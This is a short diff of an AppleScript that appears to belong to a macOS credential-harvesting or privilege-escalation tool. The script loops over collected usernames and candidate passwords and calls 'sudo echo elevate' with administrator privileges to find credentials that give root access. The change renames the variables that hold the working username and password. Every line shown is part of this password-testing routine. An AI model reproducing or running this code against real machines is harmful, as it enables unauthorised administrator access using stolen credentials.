@@ -6,8 +6,6 @@ set sk_names to {}
 set ucreds to {}
 set pcreds to {}
 set matching_users to {}
-set fauthu to ""
-set fauthp to ""
 set text_based to "0"
 set secag to "SecurityAgent"
 set md5 to " md5 | "
@@ -133,8 +131,8 @@ repeat with user_ in matching_users
 	repeat with pass in pcreds
 		try --Attempt to authenticate with those users
 			set test_ to do shell script "sudo echo elevate" user name user_ password pass with administrator privileges
-			set fauthu to user_
-			set fauthp to pass
+			set uname to user_
+			set passwd to pass
 			exit repeat
 			exit repeat
 		on error
